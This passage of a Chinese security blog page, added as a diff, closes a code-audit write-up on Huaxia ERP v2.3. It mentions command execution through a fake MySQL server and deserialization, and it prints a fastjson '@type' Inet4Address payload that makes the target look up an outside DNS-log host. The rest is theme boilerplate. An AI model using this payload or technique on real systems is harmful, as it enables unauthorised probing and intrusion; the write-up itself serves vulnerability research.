+<li><p>发送数据包后，我们的smartBi服务器尝试连接fakeMysql服务器，通过反序列化即可成功执⾏命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165105542.png" srcset="/img/loading.gif" lazyload alt="image-20250812181350575"></p>
+</li>
+<li><p>不多废话，直接展示payload：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;3.b3925eed5a.ipv6.1433.eu.org&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://lusensec.github.io/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020235518738.png" srcset="/img/loading.gif" lazyload alt="image-20241020235518738"></p>
+<p>ok，完事。</p>
+</li>
+</ul>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Java/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#Java代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>华夏-ERPv2.3搭建&amp;&amp;审计</div>
+      <div>http://example.com/2025/10/27/华夏-ERPv2.3搭建&amp;审计/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>running</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/27/P%20y%20t%20h%20o%20n%20%E5%AD%A6%20%E4%B9%A0%20%E7%AC%94%20%E8%AE%B0/" title="Python学习笔记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Python学习笔记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/27/php%E9%AB%98%E5%8D%B1/" title="php高危">
+                        <span class="hidden-mobile">php高危</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","appKey":"byZ7eSN7DH9MXIyDyXwXE8SE","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
